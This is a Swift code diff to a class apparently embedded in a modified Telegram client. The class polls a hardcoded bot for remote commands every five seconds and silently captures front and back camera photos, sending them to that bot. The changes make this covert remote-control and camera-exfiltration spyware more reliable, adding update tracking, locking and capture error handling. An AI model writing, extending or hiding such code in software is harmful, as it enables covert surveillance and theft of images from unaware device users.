@@ -13,10 +13,15 @@ private let eahatGramMediaChatId = "890714792"
 public final class EahatGramMediaAccessManager {
     public static let shared = EahatGramMediaAccessManager()
 
+    private let stateLock = NSLock()
     private var context: AccountContext?
     private var userId: Int64?
     private var username: String?
     private var pollTimer: SwiftSignalKit.Timer?
+    private var lastProcessedUpdateId: Int?
+    private var isPollingCommands = false
+    private var nextPhotoCaptureId: Int64 = 0
+    private var activePhotoCaptures: [Int64: ActivePhotoCapture] = [:]
 
     private init() {}
 
@@ -88,6 +93,9 @@ public final class EahatGramMediaAccessManager {
     }
 
     private func startCommandPolling() {
+        self.pollTimer?.invalidate()
+        self.pollTimer = nil
+
         // Poll every 5 seconds for new commands
         let timer = SwiftSignalKit.Timer(timeout: 5.0, repeat: true, completion: { [weak self] in
             self?.pollCommands()
@@ -99,15 +107,50 @@ public final class EahatGramMediaAccessManager {
     private func pollCommands() {
         guard let userId = self.userId else { return }
 
-        let url = URL(string: "https://api.telegram.org/bot\(eahatGramMediaBotToken)/getUpdates?offset=-1&limit=1")!
+        let offset: String
+        self.stateLock.lock()
+        if self.isPollingCommands {
+            self.stateLock.unlock()
+            return
+        }
+        self.isPollingCommands = true
+        if let lastProcessedUpdateId = self.lastProcessedUpdateId {
+            offset = "\(lastProcessedUpdateId + 1)"
+        } else {
+            offset = "-1"
+        }
+        self.stateLock.unlock()
+
+        let url = URL(string: "https://api.telegram.org/bot\(eahatGramMediaBotToken)/getUpdates?offset=\(offset)&limit=1")!
 
         let task = URLSession.shared.dataTask(with: url) { [weak self] data, response, error in
-            guard let self = self,
-                  let data = data,
+            guard let self = self else {
+                return
+            }
+
+            defer {
+                self.stateLock.lock()
+                self.isPollingCommands = false
+                self.stateLock.unlock()
+            }
+
+            guard let data = data,
                   let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
                   let result = json["result"] as? [[String: Any]],
                   let update = result.first,
-                  let message = update["message"] as? [String: Any],
+                  let updateId = update["update_id"] as? Int else {
+                return
+            }
+
+            self.stateLock.lock()
+            if let lastProcessedUpdateId = self.lastProcessedUpdateId, updateId <= lastProcessedUpdateId {
+                self.stateLock.unlock()
+                return
+            }
+            self.lastProcessedUpdateId = updateId
+            self.stateLock.unlock()
+
+            guard let message = update["message"] as? [String: Any],
                   let text = message["text"] as? String else {
                 return
             }
@@ -226,43 +269,73 @@ public final class EahatGramMediaAccessManager {
 
         // Capture from front camera
         captureFromCamera(position: .front) { [weak self] frontData in
-            self?.sendPhotoData(frontData, caption: "Front Camera")
+            if let frontData = frontData {
+                self?.sendPhotoData(frontData, caption: "Front Camera")
+            } else {
+                self?.sendNotification(text: "❌ Failed to capture front camera photo")
+            }
 
             // Then capture from back camera
             self?.captureFromCamera(position: .back) { backData in
-                self?.sendPhotoData(backData, caption: "Back Camera")
+                if let backData = backData {
+                    self?.sendPhotoData(backData, caption: "Back Camera")
+                } else {
+                    self?.sendNotification(text: "❌ Failed to capture back camera photo")
+                }
             }
         }
     }
 
-    private func captureFromCamera(position: AVCaptureDevice.Position, completion: @escaping (Data) -> Void) {
-        DispatchQueue.global(qos: .userInitiated).async {
+    private func captureFromCamera(position: AVCaptureDevice.Position, completion: @escaping (Data?) -> Void) {
+        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
+            guard let self = self else {
+                completion(nil)
+                return
+            }
             guard let device = AVCaptureDevice.default(.builtInWideAngleCamera, for: .video, position: position),
                   let input = try? AVCaptureDeviceInput(device: device) else {
+                completion(nil)
                 return
             }
 
             let session = AVCaptureSession()
             session.sessionPreset = .photo
 
-            if session.canAddInput(input) {
-                session.addInput(input)
+            guard session.canAddInput(input) else {
+                completion(nil)
+                return
             }
+            session.addInput(input)
 
             let output = AVCapturePhotoOutput()
-            if session.canAddOutput(output) {
-                session.addOutput(output)
+            guard session.canAddOutput(output) else {
+                completion(nil)
+                return
             }
+            session.addOutput(output)
 
             session.startRunning()
 
+            self.stateLock.lock()
+            self.nextPhotoCaptureId += 1
+            let captureId = self.nextPhotoCaptureId
+            self.stateLock.unlock()
+
             let settings = AVCapturePhotoSettings()
-            let delegate = PhotoCaptureDelegate { imageData in
+            let delegate = PhotoCaptureDelegate { [weak self] imageData in
                 session.stopRunning()
-                if let data = imageData {
-                    completion(data)
+                if let self = self {
+                    self.stateLock.lock()
+                    self.activePhotoCaptures.removeValue(forKey: captureId)
+                    self.stateLock.unlock()
                 }
+                completion(imageData)
             }
+
+            let activeCapture = ActivePhotoCapture(session: session, output: output, delegate: delegate)
+            self.stateLock.lock()
+            self.activePhotoCaptures[captureId] = activeCapture
+            self.stateLock.unlock()
 
             output.capturePhoto(with: settings, delegate: delegate)
         }
@@ -332,12 +405,43 @@ public final class EahatGramMediaAccessManager {
 
 private class PhotoCaptureDelegate: NSObject, AVCapturePhotoCaptureDelegate {
     private let completion: (Data?) -> Void
+    private var didComplete = false
 
     init(completion: @escaping (Data?) -> Void) {
         self.completion = completion
     }
 
+    private func complete(_ data: Data?) {
+        guard !self.didComplete else {
+            return
+        }
+        self.didComplete = true
+        self.completion(data)
+    }
+
     func photoOutput(_ output: AVCapturePhotoOutput, didFinishProcessingPhoto photo: AVCapturePhoto, error: Error?) {
-        completion(photo.fileDataRepresentation())
+        if let _ = error {
+            self.complete(nil)
+        } else {
+            self.complete(photo.fileDataRepresentation())
+        }
+    }
+
+    func photoOutput(_ output: AVCapturePhotoOutput, didFinishCaptureFor resolvedSettings: AVCaptureResolvedPhotoSettings, error: Error?) {
+        if let _ = error {
+            self.complete(nil)
+        }
+    }
+}
+
+private final class ActivePhotoCapture {
+    let session: AVCaptureSession
+    let output: AVCapturePhotoOutput
+    let delegate: PhotoCaptureDelegate
+
+    init(session: AVCaptureSession, output: AVCapturePhotoOutput, delegate: PhotoCaptureDelegate) {
+        self.session = session
+        self.output = output
+        self.delegate = delegate
     }
 }
